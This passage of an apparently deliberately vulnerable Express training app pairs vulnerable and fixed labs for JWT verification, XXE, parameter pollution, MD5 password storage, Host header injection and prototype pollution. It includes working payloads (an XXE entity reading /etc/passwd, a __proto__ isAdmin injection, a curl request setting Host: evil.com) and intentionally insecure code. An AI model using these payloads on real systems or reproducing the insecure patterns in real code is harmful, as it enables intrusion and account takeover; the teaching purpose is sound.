         <pre ${PRE}>${escapeHtml(JSON.stringify(decoded, null, 2))}</pre>
         ${decoded && decoded.role === "admin" ? '<p style="color:red;font-weight:bold;">&#9888; Forged admin token was accepted! No signature was verified.</p>' : ""}`}
  `);
});

app.post("/jwt-verify-fixed", (req, res) => {
  if (!jwt) return res.status(500).send("jsonwebtoken not installed");
  const token = (req.body.token || "").trim();
  let decoded, error;
  try {
    // Fixed: only accept HS256
    decoded = jwt.verify(token, JWT_SECRET, { algorithms: ["HS256"] });
  } catch (e) {
    error = e.message;
  }
  res.type("html").send(`
    <h1>Lab 26: JWT Verify — Fixed</h1>
    <p><a href="/">Back to labs</a> | <a href="/jwt-demo">Back to JWT lab</a></p>
    ${error
      ? `<p style="color:green;font-weight:bold;">&#10004; Token rejected: <code>${escapeHtml(error)}</code></p>
         <p style="color:green;">The forged token was correctly rejected because HS256 signature verification failed.</p>`
      : `<p style="color:green;">&#10004; Valid token:</p>
         <pre ${PRE}>${escapeHtml(JSON.stringify(decoded, null, 2))}</pre>`}
  `);
});

/* ========================================================================
   LAB 29 — XXE (CWE-611)
   ======================================================================== */
let XMLParser;
try {
  XMLParser = require("fast-xml-parser").XMLParser;
} catch (e) {
  XMLParser = null;
}

app.use("/xxe", express.urlencoded({ extended: true }));
app.use("/xxe-fixed", express.urlencoded({ extended: true }));

app.get("/xxe", (req, res) => {
  const defaultXml = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>test@example.com</email>
</user>`;

  res.type("html").send(`
    <h1>Lab 29a: XXE — XML External Entities (Simulated Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Submit XML data to be parsed:</p>
    <form method="post">
      <textarea name="xml" rows="10" cols="60">${escapeHtml(defaultXml)}</textarea><br><br>
      <button type="submit">Parse XML</button>
    </form>
    <p><em>Note: This is a simulated demo. <code>fast-xml-parser</code> does not resolve external
    entities by default. In Java, PHP, Python's lxml, and .NET, this attack works out of the box.</em></p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Vulnerable (Java, PHP, Python lxml, .NET):</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">DocumentBuilder db = factory.newDocumentBuilder();</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>
<span style="color:#6a9955;">// DTD processing is ENABLED by default in many XML parsers</span>
<span style="color:#6a9955;">// External entities like SYSTEM "file:///etc/passwd" are resolved</span>

<span style="color:#6a9955;">// The XML payload:</span>
<span style="color:#ce9178;">&lt;!DOCTYPE foo [</span>
<span style="color:#ce9178;">  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</span>
<span style="color:#ce9178;">]&gt;</span>
<span style="color:#ce9178;">&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;</span>

<span style="color:#6a9955;">// Parser resolves &amp;xxe; → contents of /etc/passwd</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Application accepts XML input and parses it</li>
      <li>Attacker includes a DOCTYPE with an external entity declaration</li>
      <li><code>SYSTEM "file:///etc/passwd"</code> tells the parser to read a local file</li>
      <li>Parser resolves <code>&amp;xxe;</code> with the file contents</li>
      <li>Attacker receives the server's <code>/etc/passwd</code> in the response</li>
    </ol>
  `);
});

app.post("/xxe", (req, res) => {
  const xml = req.body.xml || "";
  const hasEntity = /<!ENTITY\s+\w+\s+SYSTEM/i.test(xml);
  let parsed, error;

  if (XMLParser) {
    try {
      const parser = new XMLParser();
      parsed = parser.parse(xml);
    } catch (e) {
      error = e.message;
    }
  }

  // Simulate what a vulnerable parser would return
  let simulatedResult = null;
  if (hasEntity) {
    simulatedResult = `In a vulnerable parser (Java, PHP, Python lxml), the &xxe; entity
would be resolved. For example:

SYSTEM "file:///etc/passwd" would return:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...

SYSTEM "http://internal-server/api" would make server-side requests (SSRF via XXE).`;
  }

  res.type("html").send(`
    <h1>Lab 29a: XXE — Result</h1>
    <p><a href="/">Back to labs</a> | <a href="/xxe">Try again</a></p>
    <h3>Input XML</h3>
    <pre ${PRE}>${escapeHtml(xml)}</pre>
    ${hasEntity ? '<p style="color:red;font-weight:bold;">&#9888; External entity declaration detected!</p>' : ""}
    ${parsed ? `<h3>Parsed (fast-xml-parser — safe by default)</h3><pre ${PRE}>${escapeHtml(JSON.stringify(parsed, null, 2))}</pre>` : ""}
    ${error ? `<pre style="color:red;">${escapeHtml(error)}</pre>` : ""}
    ${simulatedResult ? `<h3>What a Vulnerable Parser Would Return</h3><pre style="background:#2d1111;color:#f0a0a0;padding:1rem;border-radius:6px;">${escapeHtml(simulatedResult)}</pre>` : ""}
  `);
});

app.get("/xxe-fixed", (req, res) => {
  res.type("html").send(`
    <h1>Lab 29b: XXE — Disabled DTD (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>
    <form method="post">
      <textarea name="xml" rows="8" cols="60">${escapeHtml('<?xml version="1.0"?>\n<user>\n  <name>alice</name>\n  <email>alice@example.com</email>\n</user>')}</textarea><br><br>
      <button type="submit">Parse XML (Safe)</button>
    </form>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Fixed: disable DTD processing entirely</span>

<span style="color:#6a9955;">// Java:</span>
factory.setFeature(<span style="color:#ce9178;">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span style="color:#569cd6;">true</span>);

<span style="color:#6a9955;">// Python (defusedxml):</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">import defusedxml.ElementTree as ET</span>  <span style="color:#6a9955;">// &lt;-- THE FIX</span>
tree = ET.parse(xml_input)

<span style="color:#6a9955;">// Node.js (fast-xml-parser is safe by default):</span>
<span style="color:#6a9955;">// But explicitly reject DTDs for defense-in-depth:</span>
<span style="color:#c586c0;">if</span> (xml.includes(<span style="color:#ce9178;">"&lt;!DOCTYPE"</span>) || xml.includes(<span style="color:#ce9178;">"&lt;!ENTITY"</span>)) {
  <span style="background:#1a3a1a;color:#89d185;font-weight:bold;">reject("DTD/entities not allowed");</span>
}

<span style="color:#6a9955;">// Best: use JSON instead of XML when possible.</span></code></pre>

    <details>
      <summary>How does this fix it?</summary>
      <p>The core fix is to <strong>disable DTD processing</strong> in the XML parser.
      Without DTD support, external entity declarations are rejected.</p>
      <p><strong>Prevention strategies:</strong></p>
      <ul>
        <li>Disable DTDs entirely (safest)</li>
        <li>Use <code>defusedxml</code> (Python) or equivalent safe parsers</li>
        <li>Reject input containing <code>&lt;!DOCTYPE</code> or <code>&lt;!ENTITY</code></li>
        <li>Use JSON instead of XML when possible</li>
        <li>Keep XML parsers updated</li>
      </ul>
    </details>
  `);
});

app.post("/xxe-fixed", (req, res) => {
  const xml = req.body.xml || "";
  // Reject DTDs entirely
  if (/<!DOCTYPE|<!ENTITY/i.test(xml)) {
    return res.type("html").send(`
      <h1>Lab 29b: XXE — Blocked</h1>
      <p><a href="/">Back to labs</a> | <a href="/xxe-fixed">Try again</a></p>
      <p style="color:green;font-weight:bold;">&#10004; Rejected! XML contains DOCTYPE/ENTITY declarations.</p>
      <p>DTD processing is disabled — external entities cannot be resolved.</p>
    `);
  }

  let parsed, error;
  if (XMLParser) {
    try {
      const parser = new XMLParser();
      parsed = parser.parse(xml);
    } catch (e) {
      error = e.message;
    }
  }

  res.type("html").send(`
    <h1>Lab 29b: XXE — Result (Fixed)</h1>
    <p><a href="/">Back to labs</a> | <a href="/xxe-fixed">Try again</a></p>
    <p style="color:green;">&#10004; No DTD/entity declarations — XML parsed safely.</p>
    ${parsed ? `<pre ${PRE}>${escapeHtml(JSON.stringify(parsed, null, 2))}</pre>` : ""}
    ${error ? `<pre style="color:red;">${escapeHtml(error)}</pre>` : ""}
  `);
});

/* ========================================================================
   LAB 38 — HTTP Parameter Pollution (CWE-235)
   ======================================================================== */
app.get("/hpp", (req, res) => {
  const role = req.query.role;
  // Vulnerable: checks first value but backend uses last value
  const firstValue = Array.isArray(role) ? role[0] : role;
  const lastValue = Array.isArray(role) ? role[role.length - 1] : role;
  const allowed = firstValue === "user";
  const assignedRole = lastValue;

  res.type("html").send(`
    <h1>Lab 38a: HTTP Parameter Pollution (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>

    <p>Enter a role to request access:</p>
    <form method="get">
      <input name="role" value="user" size="30">
      <button type="submit">Submit</button>
    </form>
    <p><a href="/hpp?role=user&role=admin">Try it: /hpp?role=user&amp;role=admin</a> (duplicate param attack)</p>
    <hr>

    ${role !== undefined ? `
      <h3>Result</h3>
      <p>Raw <code>req.query.role</code> = <code>${escapeHtml(JSON.stringify(role))}</code></p>
      <p>Validation checked: <code>${escapeHtml(String(firstValue))}</code> → ${allowed
        ? '<span style="color:green;">allowed</span>'
        : '<span style="color:red;">denied</span>'}</p>
      <p>Assigned role: <strong style="color:${assignedRole === "admin" ? "red" : "green"};">${escapeHtml(String(assignedRole))}</strong></p>
      ${Array.isArray(role) && assignedRole === "admin"
        ? '<p style="color:red;font-weight:bold;">&#9888; Parameter pollution! Validation saw "user" but the backend assigned "admin".</p>'
        : ""}
      <hr>
    ` : ""}

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#608b4e;">// Express extended query parser turns ?role=user&role=admin into ["user","admin"]</span>
<span style="color:#9cdcfe;">const</span> role = req.query.role;

<span style="color:#608b4e;">// Vulnerable: validation checks first value...</span>
<span style="color:#9cdcfe;">const</span> firstValue = <span style="color:#4ec9b0;">Array</span>.isArray(role) ? role[<span style="color:#b5cea8;">0</span>] : role;
<span style="color:#608b4e;">// ...but backend uses last value</span>
<span style="color:#9cdcfe;">const</span> lastValue = <span style="color:#4ec9b0;">Array</span>.isArray(role) ? role[role.length - <span style="color:#b5cea8;">1</span>] : role;

<span style="color:#c586c0;">if</span> (firstValue === <span style="color:#ce9178;">"user"</span>) {
  assignRole(lastValue); <span style="color:#608b4e;">// &#9888; attacker gets "admin"!</span>
}</code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Attacker sends <code>?role=user&amp;role=admin</code></li>
      <li>Express parses it as <code>["user", "admin"]</code></li>
      <li>Validation checks <code>role[0]</code> → "user" → allowed</li>
      <li>Backend reads <code>role[role.length-1]</code> → "admin" → privilege escalation</li>
    </ol>

    <details>
      <summary><strong>Why does this happen?</strong></summary>
      <p>HTTP allows repeated query parameters. Express's <code>extended</code> query parser
         (powered by the <code>qs</code> library) turns duplicate keys into arrays. If different
         parts of the application read different indices, an attacker can pass validation with
         one value while the backend processes another — a classic TOCTOU via parameter pollution.</p>
    </details>
  `);
});

app.get("/hpp-fixed", (req, res) => {
  const role = req.query.role;
  // Fixed: reject arrays — only accept string values
  const isValid = typeof role === "string";
  const rejected = !isValid && role !== undefined;

  res.type("html").send(`
    <h1>Lab 38b: HTTP Parameter Pollution (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>

    <p>Enter a role to request access:</p>
    <form method="get">
      <input name="role" value="user" size="30">
      <button type="submit">Submit</button>
    </form>
    <p><a href="/hpp-fixed?role=user&role=admin">Try it: /hpp-fixed?role=user&amp;role=admin</a> (duplicate param attack)</p>
    <hr>

    ${rejected ? `
      <p style="color:green;font-weight:bold;">&#10004; Rejected! Parameter "role" must be a single string value.</p>
      <p>Received: <code>${escapeHtml(JSON.stringify(role))}</code> (type: ${typeof role === "object" ? "array" : typeof role})</p>
      <hr>
    ` : ""}

    ${isValid ? `
      <h3>Result</h3>
      <p>Role: <strong style="color:green;">${escapeHtml(role)}</strong></p>
      <p style="color:green;">&#10004; Single string value accepted safely.</p>
      <hr>
    ` : ""}

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> role = req.query.role;

<span style="color:#608b4e;">// Fixed: strict type check — reject arrays from duplicate params</span>
<span style="color:#c586c0;">if</span> (<span style="color:#569cd6;">typeof</span> role !== <span style="color:#ce9178;">"string"</span>) {
  <span style="color:#c586c0;">return</span> res.status(<span style="color:#b5cea8;">400</span>).send(<span style="color:#ce9178;">"role must be a single value"</span>);
}

<span style="color:#608b4e;">// Now role is guaranteed to be a string, not an array</span>
assignRole(role);</code></pre>

    <details>
      <summary><strong>How does this fix it?</strong></summary>
      <p>The fix checks <code>typeof role !== "string"</code> before processing. If the attacker
         sends duplicate parameters, Express parses them as an array — which fails the type check.
         Only a single string value is accepted, eliminating the pollution vector.</p>
      <p>Other defenses include: using <code>app.set("query parser", "simple")</code> (which uses
         Node's built-in <code>querystring</code> module and takes the last value), or explicitly
         extracting only the first value with a middleware wrapper.</p>
    </details>
  `);
});

/* ========================================================================
   LAB 39 — Insecure Password Storage (CWE-916)
   ======================================================================== */
app.use("/weak-password", express.urlencoded({ extended: true }));
app.use("/weak-password-fixed", express.urlencoded({ extended: true }));

// Pre-computed rainbow table for common passwords
const RAINBOW_TABLE = {
  "5f4dcc3b5aa765d61d8327deb882cf99": "password",
  "e10adc3949ba59abbe56e057f20f883e": "123456",
  "d8578edf8458ce06fbc5bb76a58c5ca4": "qwerty",
  "25d55ad283aa400af464c76d713c07ad": "12345678",
  "e99a18c428cb38d5f260853678922e03": "abc123",
  "fcea920f7412b5da7be0cf42b8c93759": "1234567",
  "25f9e794323b453885f5181f1b624d0b": "123456789",
  "d077f244def8a70e5ea758bd8352fcd8": "letmein",
  "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8": "password",
  "0d107d09f5bbe40cade3de5c71e9e9b7": "admin",
  "827ccb0eea8a706c4c34a16891f84e7b": "12345",
  "e3afed0047b08059d0fada10f400c1e5": "monkey",
};

app.get("/weak-password", (req, res) => {
  res.type("html").send(`
    <h1>Lab 39a: Insecure Password Storage (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>

    <p>Register with a password to see how it's stored:</p>
    <form method="post">
      <label>Password: <input type="text" name="password" value="password" size="30"></label><br><br>
      <button type="submit">Register</button>
    </form>
    <p class="info">Try common passwords like: password, 123456, admin, qwerty, letmein</p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#608b4e;">// Vulnerable: MD5 hash with no salt</span>
<span style="color:#9cdcfe;">const</span> hash = crypto.<span style="color:#dcdcaa;">createHash</span>(<span style="color:#ce9178;">"md5"</span>)
  .<span style="color:#dcdcaa;">update</span>(password)
  .<span style="color:#dcdcaa;">digest</span>(<span style="color:#ce9178;">"hex"</span>);

<span style="color:#608b4e;">// Store hash in database</span>
db.run(<span style="color:#ce9178;">"INSERT INTO users (password_hash) VALUES (?)"</span>, hash);</code></pre>

    <details>
      <summary><strong>Why is MD5 dangerous for passwords?</strong></summary>
      <ul>
        <li><strong>No salt:</strong> identical passwords produce identical hashes — enables rainbow table attacks</li>
        <li><strong>Too fast:</strong> MD5 can compute billions of hashes/second on GPUs</li>
        <li><strong>Broken:</strong> MD5 has known collision vulnerabilities</li>
        <li><strong>Deterministic:</strong> same input always produces the same output without a random salt</li>
      </ul>
    </details>
  `);
});

app.post("/weak-password", (req, res) => {
  const password = req.body.password || "";
  const hash = crypto.createHash("md5").update(password).digest("hex");
  const cracked = RAINBOW_TABLE[hash];

  res.type("html").send(`
    <h1>Lab 39a: Insecure Password Storage — Result (Vulnerable)</h1>
    <p><a href="/">Back to labs</a> | <a href="/weak-password">Try again</a></p>

    <h3>Stored Hash</h3>
    <p>Algorithm: <code>MD5</code> (no salt)</p>
    <pre ${PRE}>${escapeHtml(hash)}</pre>

    <h3>Rainbow Table Lookup</h3>
    ${cracked
      ? `<p style="color:red;font-weight:bold;">&#9888; CRACKED! Hash reversed to: <code>${escapeHtml(cracked)}</code></p>
         <p>A pre-computed rainbow table instantly recovered the password from the hash.
            No brute force needed — the attacker simply looks up the hash in a table of
            billions of pre-computed MD5 values.</p>`
      : `<p style="color:orange;">Hash not found in this demo rainbow table, but a full table
            (~15 GB for MD5) would cover far more passwords.</p>`}

    <h3>Why This Is Dangerous</h3>
    <table style="border-collapse:collapse;">
      <tr><td style="padding:4px 12px;border:1px solid #ccc;">MD5 speed</td>
          <td style="padding:4px 12px;border:1px solid #ccc;">~25 billion hashes/sec on GPU</td></tr>
      <tr><td style="padding:4px 12px;border:1px solid #ccc;">8-char password space</td>
          <td style="padding:4px 12px;border:1px solid #ccc;">~218 trillion combinations</td></tr>
      <tr><td style="padding:4px 12px;border:1px solid #ccc;">Time to crack</td>
          <td style="padding:4px 12px;border:1px solid #ccc;">~2.4 hours (brute force all 8-char)</td></tr>
    </table>
  `);
});

app.get("/weak-password-fixed", (req, res) => {
  res.type("html").send(`
    <h1>Lab 39b: Secure Password Storage (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>

    <p>Register with a password to see how it's stored securely:</p>
    <form method="post">
      <label>Password: <input type="text" name="password" value="password" size="30"></label><br><br>
      <button type="submit">Register</button>
    </form>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#608b4e;">// Fixed: scrypt with random 16-byte salt</span>
<span style="color:#9cdcfe;">const</span> salt = crypto.<span style="color:#dcdcaa;">randomBytes</span>(<span style="color:#b5cea8;">16</span>).<span style="color:#dcdcaa;">toString</span>(<span style="color:#ce9178;">"hex"</span>);
<span style="color:#9cdcfe;">const</span> hash = crypto.<span style="color:#dcdcaa;">scryptSync</span>(password, salt, <span style="color:#b5cea8;">64</span>).<span style="color:#dcdcaa;">toString</span>(<span style="color:#ce9178;">"hex"</span>);
<span style="color:#9cdcfe;">const</span> stored = salt + <span style="color:#ce9178;">":"</span> + hash;

<span style="color:#608b4e;">// Store in database — each user gets a unique salt</span>
db.run(<span style="color:#ce9178;">"INSERT INTO users (password_hash) VALUES (?)"</span>, stored);</code></pre>

    <details>
      <summary><strong>Why is scrypt safe?</strong></summary>
      <ul>
        <li><strong>Random salt:</strong> identical passwords produce different hashes</li>
        <li><strong>Memory-hard:</strong> requires significant RAM, making GPU attacks impractical</li>
        <li><strong>Intentionally slow:</strong> ~100ms per hash vs nanoseconds for MD5</li>
        <li><strong>Proven:</strong> recommended by OWASP alongside bcrypt and Argon2</li>
      </ul>
    </details>
  `);
});

app.post("/weak-password-fixed", (req, res) => {
  const password = req.body.password || "";
  const salt = crypto.randomBytes(16).toString("hex");

  const start = process.hrtime.bigint();
  const hash = crypto.scryptSync(password, salt, 64).toString("hex");
  const elapsed = Number(process.hrtime.bigint() - start) / 1e6; // ms

  const stored = salt + ":" + hash;

  // Hash it again to show different output
  const salt2 = crypto.randomBytes(16).toString("hex");
  const hash2 = crypto.scryptSync(password, salt2, 64).toString("hex");
  const stored2 = salt2 + ":" + hash2;

  res.type("html").send(`
    <h1>Lab 39b: Secure Password Storage — Result (Fixed)</h1>
    <p><a href="/">Back to labs</a> | <a href="/weak-password-fixed">Try again</a></p>

    <h3>Stored Hash</h3>
    <p>Algorithm: <code>scrypt</code> (N=16384, r=8, p=1) with random 16-byte salt</p>
    <pre ${PRE}>${escapeHtml(stored)}</pre>

    <h3>Same Password, Different Salt</h3>
    <p>Hashing the same password again produces a completely different output:</p>
    <pre ${PRE}>${escapeHtml(stored2)}</pre>

    <p style="color:green;font-weight:bold;">&#10004; Rainbow tables are useless — every hash is unique even for identical passwords.</p>

    <h3>Performance Comparison</h3>
    <table style="border-collapse:collapse;">
      <tr><th style="padding:4px 12px;border:1px solid #ccc;">Algorithm</th>
          <th style="padding:4px 12px;border:1px solid #ccc;">Time per hash</th>
          <th style="padding:4px 12px;border:1px solid #ccc;">GPU attacks?</th></tr>
      <tr><td style="padding:4px 12px;border:1px solid #ccc;">MD5</td>
          <td style="padding:4px 12px;border:1px solid #ccc;">~0.00004 ms</td>
          <td style="padding:4px 12px;border:1px solid #ccc;">Trivial (25B/sec)</td></tr>
      <tr><td style="padding:4px 12px;border:1px solid #ccc;color:green;font-weight:bold;">scrypt</td>
          <td style="padding:4px 12px;border:1px solid #ccc;color:green;font-weight:bold;">${elapsed.toFixed(1)} ms</td>
          <td style="padding:4px 12px;border:1px solid #ccc;color:green;">Memory-hard, impractical</td></tr>
    </table>
  `);
});

/* ========================================================================
   LAB 40 — Host Header Injection (CWE-644)
   ======================================================================== */
app.use("/host-header", express.urlencoded({ extended: true }));
app.use("/host-header-fixed", express.urlencoded({ extended: true }));

app.get("/host-header", (req, res) => {
  res.type("html").send(`
    <h1>Lab 40a: Host Header Injection (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>

    <p>Simulate a "Forgot Password" request for a demo user:</p>
    <form method="post">
      <label>Email: <input type="text" name="email" value="victim@example.com" size="30"></label><br><br>
      <button type="submit">Send Reset Link</button>
    </form>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#608b4e;">// Vulnerable: reset link built from Host header</span>
<span style="color:#9cdcfe;">const</span> host = req.headers.host;
<span style="color:#9cdcfe;">const</span> token = crypto.<span style="color:#dcdcaa;">randomBytes</span>(<span style="color:#b5cea8;">32</span>).<span style="color:#dcdcaa;">toString</span>(<span style="color:#ce9178;">"hex"</span>);
<span style="color:#9cdcfe;">const</span> resetLink = <span style="color:#ce9178;">\`https://\${host}/reset?token=\${token}\`</span>;

<span style="color:#608b4e;">// Email sent to victim contains attacker-controlled URL</span>
sendEmail(user.email, <span style="color:#ce9178;">\`Reset: \${resetLink}\`</span>);</code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Attacker sends forgot-password POST with <code>Host: evil.com</code></li>
      <li>Server builds reset link as <code>https://evil.com/reset?token=abc123</code></li>
      <li>Victim receives email with the poisoned link</li>
      <li>Victim clicks the link — token is sent to attacker's server</li>
      <li>Attacker uses the token to reset the victim's password</li>
    </ol>

    <details>
      <summary><strong>Why is this dangerous?</strong></summary>
      <p>The <code>Host</code> header is entirely controlled by the client. In shared hosting,
         reverse proxy configurations, or when a CDN forwards requests, the Host header may be
         trivially spoofable. Using it to build security-sensitive URLs (password resets,
         email verification, OAuth callbacks) enables phishing and token theft.</p>
    </details>
  `);
});

app.post("/host-header", (req, res) => {
  const email = req.body.email || "victim@example.com";
  const host = req.headers.host;
  const token = crypto.randomBytes(32).toString("hex");
  const resetLink = `https://${host}/reset?token=${token}`;

  res.type("html").send(`
    <h1>Lab 40a: Host Header Injection — Result (Vulnerable)</h1>
    <p><a href="/">Back to labs</a> | <a href="/host-header">Try again</a></p>

    <h3>Generated Reset Email</h3>
    <div style="background:#f9f9f9;border:1px solid #ddd;padding:1rem;border-radius:6px;font-family:monospace;">
      <p><strong>To:</strong> ${escapeHtml(email)}</p>
      <p><strong>Subject:</strong> Password Reset Request</p>
      <hr>
      <p>Click the link below to reset your password:</p>
      <p><a href="#">${escapeHtml(resetLink)}</a></p>
    </div>

    <p style="color:red;font-weight:bold;">&#9888; The reset link uses the Host header: <code>${escapeHtml(host)}</code></p>
    <p>If an attacker sends this request with <code>Host: evil.com</code>, the victim receives
       a reset link pointing to the attacker's server. When the victim clicks it,
       the token is leaked to the attacker.</p>

    <h3>Try It (curl)</h3>
    <pre ${PRE}>curl -X POST http://localhost:3000/host-header \\
  -H "Host: evil.com" \\
  -d "email=victim@example.com"</pre>
  `);
});

app.get("/host-header-fixed", (req, res) => {
  res.type("html").send(`
    <h1>Lab 40b: Host Header Injection (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>

    <p>Simulate a "Forgot Password" request for a demo user:</p>
    <form method="post">
      <label>Email: <input type="text" name="email" value="victim@example.com" size="30"></label><br><br>
      <button type="submit">Send Reset Link</button>
    </form>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#608b4e;">// Fixed: use a hardcoded/allowlisted origin</span>
<span style="color:#9cdcfe;">const</span> ALLOWED_ORIGINS = [<span style="color:#ce9178;">"myapp.example.com"</span>];
<span style="color:#9cdcfe;">const</span> origin = ALLOWED_ORIGINS[<span style="color:#b5cea8;">0</span>]; <span style="color:#608b4e;">// or from config/env</span>
<span style="color:#9cdcfe;">const</span> token = crypto.<span style="color:#dcdcaa;">randomBytes</span>(<span style="color:#b5cea8;">32</span>).<span style="color:#dcdcaa;">toString</span>(<span style="color:#ce9178;">"hex"</span>);
<span style="color:#9cdcfe;">const</span> resetLink = <span style="color:#ce9178;">\`https://\${origin}/reset?token=\${token}\`</span>;

<span style="color:#608b4e;">// Host header is ignored — link always points to trusted domain</span>
sendEmail(user.email, <span style="color:#ce9178;">\`Reset: \${resetLink}\`</span>);</code></pre>

    <details>
      <summary><strong>How does this fix it?</strong></summary>
      <p>The fix never reads <code>req.headers.host</code> for building URLs. Instead, the
         application origin is hardcoded in configuration or loaded from an environment variable.
         Even if an attacker spoofs the Host header, the reset link always points to the
         legitimate domain.</p>
      <p>Additional defenses: validate the Host header against an allowlist in middleware,
         or use a reverse proxy that strips/overwrites the Host header.</p>
    </details>
  `);
});

app.post("/host-header-fixed", (req, res) => {
  const email = req.body.email || "victim@example.com";
  const ALLOWED_ORIGINS = ["myapp.example.com"];
  const origin = ALLOWED_ORIGINS[0];
  const receivedHost = req.headers.host;
  const token = crypto.randomBytes(32).toString("hex");
  const resetLink = `https://${origin}/reset?token=${token}`;

  res.type("html").send(`
    <h1>Lab 40b: Host Header Injection — Result (Fixed)</h1>
    <p><a href="/">Back to labs</a> | <a href="/host-header-fixed">Try again</a></p>

    <h3>Generated Reset Email</h3>
    <div style="background:#f0fff0;border:1px solid #aca;padding:1rem;border-radius:6px;font-family:monospace;">
      <p><strong>To:</strong> ${escapeHtml(email)}</p>
      <p><strong>Subject:</strong> Password Reset Request</p>
      <hr>
      <p>Click the link below to reset your password:</p>
      <p><a href="#">${escapeHtml(resetLink)}</a></p>
    </div>

    <p style="color:green;font-weight:bold;">&#10004; Reset link uses allowlisted origin: <code>${escapeHtml(origin)}</code></p>
    <p>Incoming Host header was: <code>${escapeHtml(receivedHost)}</code> — but it was <strong>ignored</strong>.</p>
    <p>Even with <code>Host: evil.com</code>, the link always points to <code>${escapeHtml(origin)}</code>.</p>

    <h3>Try It (curl)</h3>
    <pre ${PRE}>curl -X POST http://localhost:3000/host-header-fixed \\
  -H "Host: evil.com" \\
  -d "email=victim@example.com"

<span style="color:#608b4e;"># Reset link will still point to myapp.example.com, not evil.com</span></pre>
  `);
});


/* ========================================================================
   LAB 41 — Prototype Pollution (CWE-1321)
   ======================================================================== */
app.use("/proto-pollution", express.json());
app.use("/proto-pollution-fixed", express.json());

// Unsafe recursive merge — does not filter __proto__ or constructor
function unsafeMerge(target, source) {
  for (const key in source) {
    if (typeof source[key] === "object" && source[key] !== null && !Array.isArray(source[key])) {
      if (!target[key]) target[key] = {};
      unsafeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Safe recursive merge — blocks dangerous keys
function safeMerge(target, source) {
  for (const key in source) {
    if (key === "__proto__" || key === "constructor" || key === "prototype") continue;
    if (typeof source[key] === "object" && source[key] !== null && !Array.isArray(source[key])) {
      if (!target[key]) target[key] = {};
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

app.get("/proto-pollution", (req, res) => {
  res.type("html").send(`
    <h1>Lab 41a: Prototype Pollution (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>

    <p>This app merges user-supplied JSON into a config object. Try injecting <code>__proto__</code>:</p>
    <form id="ppform">
      <textarea id="ppinput" rows="6" cols="50">{"__proto__": {"isAdmin": true}}</textarea><br><br>
      <button type="submit">Merge Config</button>
    </form>
    <p class="info">The payload pollutes <code>Object.prototype</code>, so <em>every</em> object inherits <code>isAdmin: true</code>.</p>
    <div id="result"></div>
    <hr>

    <script>
      document.getElementById("ppform").addEventListener("submit", async (e) => {
        e.preventDefault();
        const body = document.getElementById("ppinput").value;
        const resp = await fetch("/proto-pollution", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body
        });
        document.getElementById("result").innerHTML = await resp.text();
      });
    </script>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#608b4e;">// Unsafe merge — no key filtering</span>
<span style="color:#c586c0;">function</span> <span style="color:#dcdcaa;">unsafeMerge</span>(target, source) {
  <span style="color:#c586c0;">for</span> (<span style="color:#9cdcfe;">const</span> key <span style="color:#c586c0;">in</span> source) {
    <span style="color:#c586c0;">if</span> (<span style="color:#569cd6;">typeof</span> source[key] === <span style="color:#ce9178;">"object"</span>) {
      <span style="color:#c586c0;">if</span> (!target[key]) target[key] = {};
      unsafeMerge(target[key], source[key]);
    } <span style="color:#c586c0;">else</span> {
      target[key] = source[key]; <span style="color:#608b4e;">// &#9888; writes to __proto__!</span>
    }
  }
}</code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Attacker sends <code>{"__proto__": {"isAdmin": true}}</code></li>
      <li><code>unsafeMerge</code> recurses into <code>__proto__</code> as a normal key</li>
      <li>This writes to <code>Object.prototype.isAdmin = true</code></li>
      <li>Now <code>{}.isAdmin === true</code> for every object in the process</li>
      <li>Authorization checks like <code>if (user.isAdmin)</code> are bypassed</li>
    </ol>

    <details>
      <summary><strong>Why is this dangerous?</strong></summary>
      <p>Prototype pollution modifies the prototype chain shared by all objects. It can lead to:</p>
      <ul>
        <li><strong>Privilege escalation:</strong> inject <code>isAdmin</code>, <code>role</code>, etc.</li>
        <li><strong>RCE:</strong> pollute properties read by templating engines or child_process</li>
        <li><strong>DoS:</strong> override <code>toString</code> or <code>valueOf</code> to crash the app</li>
      </ul>
      <p>Lab 14 shows prototype pollution leading to XSS. This lab covers the general case.</p>
    </details>
  `);
});

app.post("/proto-pollution", (req, res) => {
  // Use a fresh object per request to avoid cross-request pollution
  const config = { theme: "light", lang: "en" };
  const userInput = req.body;

